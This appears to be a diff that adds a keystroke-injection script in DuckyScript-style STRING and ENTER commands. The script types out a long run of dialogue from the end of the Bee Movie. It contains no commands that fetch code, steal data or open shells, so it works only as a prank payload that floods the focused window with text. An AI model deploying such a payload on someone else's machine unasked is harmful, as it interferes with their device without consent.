+ENTER
+STRING Get this on the air!
+ENTER
+STRING Got it.
+ENTER
+STRING Stand by.
+ENTER
+STRING We're going live.
+ENTER
+STRING The way we work may be a mystery to you. Making honey takes a lot of bees doing a lot of small jobs.
+ENTER
+STRING But let me tell you about a small job. If you do it well, it makes a big difference.
+ENTER
+STRING More than we realized. To us, to everyone.
+ENTER
+STRING That's why I want to get bees back to working together. That's the bee way! We're not made of Jell-O.
+ENTER
+STRING We get behind a fellow.
+ENTER
+STRING Black and yellow!
+ENTER
+STRING Hello!
+ENTER
+STRING Left, right, down, hover.
+ENTER
+STRING Hover?
+ENTER
+STRING Forget hover.
+ENTER
+STRING This isn't so hard.
+ENTER
+STRING Beep-beep! Beep-beep!
+ENTER
+STRING Barry, what happened?!
+ENTER
+STRING Wait, I think we were on autopilot the whole time.
+ENTER
+STRING That may have been helping me.
+ENTER
+STRING And now we're not!
+ENTER
+STRING So it turns out I cannot fly a plane.
+ENTER
+STRING All of you, let's get behind this fellow! Move it out!
+ENTER
+STRING Move out!
+ENTER
+STRING Our only chance is if I do what I'd do, you copy me with the wings of the plane!
+ENTER
+STRING Don't have to yell.
+ENTER
+STRING I'm not yelling! We're in a lot of trouble.
+ENTER
+STRING It's very hard to concentrate with that panicky tone in your voice!
+ENTER
+STRING It's not a tone. I'm panicking!
+ENTER
+STRING I can't do this!
+ENTER
+STRING Vanessa, pull yourself together. You have to snap out of it!
+ENTER
+STRING You snap out of it.
+ENTER
+STRING You snap out of it.
+ENTER
+STRING You snap out of it!
+ENTER
+STRING You snap out of it!
+ENTER
+STRING You snap out of it!
+ENTER
+STRING You snap out of it!
+ENTER
+STRING You snap out of it!
+ENTER
+STRING You snap out of it!
+ENTER
+STRING Hold it!
+ENTER
+STRING Why? Come on, it's my turn.
+ENTER
+STRING How is the plane flying?
+ENTER
+STRING I don't know.
+ENTER
+STRING Hello?
+ENTER
+STRING Benson, got any flowers for a happy occasion in there?
+ENTER
+STRING The Pollen Jocks!
+ENTER
+STRING They do get behind a fellow.
+ENTER
+STRING Black and yellow.
+ENTER
+STRING Hello.
+ENTER
+STRING All right, let's drop this tin can on the blacktop.
+ENTER
+STRING Where? I can't see anything. Can you?
+ENTER
+STRING No, nothing. It's all cloudy.
+ENTER
+STRING Come on. You got to think bee, Barry.
+ENTER
+STRING Thinking bee.
+ENTER
+STRING Thinking bee.
+ENTER
+STRING Thinking bee!
+ENTER
+STRING Thinking bee! Thinking bee!
+ENTER
+STRING Wait a minute. I think I'm feeling something.
+ENTER
+STRING What?
+ENTER
+STRING I don't know. It's strong, pulling me.
+ENTER
+STRING Like a 27-million-year-old instinct.
+ENTER
+STRING Bring the nose down.
+ENTER
+STRING Thinking bee!
+ENTER
+STRING Thinking bee! Thinking bee!
+ENTER
+STRING What in the world is on the tarmac?
+ENTER
+STRING Get some lights on that!
+ENTER
+STRING Thinking bee!
+ENTER
+STRING Thinking bee! Thinking bee!
+ENTER
+STRING Vanessa, aim for the flower.
+ENTER
+STRING OK.
+ENTER
+STRING Cut the engines. We're going in on bee power. Ready, boys?
+ENTER
+STRING Affirmative!
+ENTER
+STRING Good. Good. Easy, now. That's it.
+ENTER
+STRING Land on that flower!
+ENTER
+STRING Ready? Full reverse!
+ENTER
+STRING Spin it around!
+ENTER
+STRING Not that flower! The other one!
+ENTER
+STRING Which one?
+ENTER
+STRING That flower.
+ENTER
+STRING I'm aiming at the flower!
+ENTER
+STRING That's a fat guy in a flowered shirt.
+ENTER
+STRING I mean the giant pulsating flower made of millions of bees!
+ENTER
+STRING Pull forward. Nose down. Tail up.
+ENTER
+STRING Rotate around it.
+ENTER
+STRING This is insane, Barry!
+ENTER
+STRING This's the only way I know how to fly.
+ENTER
+STRING Am I koo-koo-kachoo, or is this plane flying in an insect-like pattern?
+ENTER
+STRING Get your nose in there. Don't be afraid. Smell it. Full reverse!
+ENTER
+STRING Just drop it. Be a part of it.
+ENTER
+STRING Aim for the center!
+ENTER
+STRING Now drop it in! Drop it in, woman!
+ENTER
+STRING Come on, already.
+ENTER
+STRING Barry, we did it! You taught me how to fly!
+ENTER
+STRING Yes. No high-five!
+ENTER
+STRING Right.
+ENTER
+STRING Barry, it worked!
+ENTER
+STRING Did you see the giant flower?
+ENTER
+STRING What giant flower? Where? Of course
+ENTER
+STRING I saw the flower! That was genius!
+ENTER
+STRING Thank you.
+ENTER
+STRING But we're not done yet.
+ENTER
+STRING Listen, everyone!
+ENTER
+STRING This runway is covered with the last pollen from the last flowers available anywhere on Earth.
+ENTER
+STRING That means this is our Last Chance. We're the only ones who make honey, pollinate flowers and dress like this.
+ENTER
+STRING If we're gonna survive as a species, this is our moment! What do you say?
+ENTER
+STRING Are we going to be bees, or just Museum of Natural History keychains?
+ENTER
+STRING We're bees!
+ENTER
+STRING Keychain!
+ENTER
+STRING Then follow me! Except Keychain.
+ENTER
+STRING Hold on, Barry. Here. You've earned this.
+ENTER
+STRING Yeah!
+ENTER
+STRING I'm a Pollen Jock! And it's a perfect fit. All I gotta do are the sleeves.
+ENTER
+STRING Oh, yeah.
+ENTER
+STRING That's our Barry.
+ENTER
+STRING Mom! The bees are back!
+ENTER
+STRING If anybody needs to make a call, now's the time. I got a feeling we'll be working late tonight!
+ENTER
+STRING Here's your change. Have a great afternoon! Can I help who's next?
+ENTER
+STRING Would you like some honey with that?
+ENTER
+STRING It is bee-approved. Don't forget these.
+ENTER
+STRING Milk, cream, cheese, it's all me.  And I don't see a nickel!
+ENTER
+STRING Sometimes I just feel like a piece of meat!
+ENTER
+STRING I had no idea.
+ENTER
+STRING Barry, I'm sorry.
+ENTER
+STRING Have you got a moment?
+ENTER
+STRING Would you excuse me?
+ENTER
+STRING My mosquito associate will help you.
+ENTER
+STRING Sorry I'm late.
+ENTER
+STRING He's a lawyer too?
+ENTER
+STRING I was already a blood-sucking parasite. All I needed was a briefcase.
+ENTER
+STRING Have a great afternoon!
+ENTER
+STRING Barry, I just got this huge tulip order, and I can't get them anywhere.
+ENTER
+STRING No problem, Vannie. Just leave it to me.
+ENTER
+STRING You're a lifesaver, Barry. Can I help who's next?
+ENTER
+STRING All right, scramble, jocks! It's time to fly.
+ENTER
+STRING Thank you, Barry!
+ENTER
+STRING That bee is living my life!
+ENTER
+STRING Let it go, Kenny.
+ENTER
+STRING When will this nightmare end?!
+ENTER
+STRING Let it all go.
+ENTER
+STRING Beautiful day to fly.
+ENTER
+STRING Sure is.
+ENTER
+STRING Between you and me,
+ENTER
+STRING I was dying to get out of that office.
+ENTER
+STRING You have got to start thinking bee, my friend.
+ENTER
+STRING Thinking bee!
+ENTER
+STRING Me?
+ENTER
+STRING Hold it. Let's just stop for a second. Hold it.
+ENTER
+STRING I'm sorry. I'm sorry, everyone. Can we stop here?
+ENTER
+STRING I'm not making a major life decision during a production number!
+ENTER
+STRING All right. Take ten, everybody. Wrap it up, guys.
+ENTER
+STRING I had virtually no rehearsal for that.
+ENTER
+
+
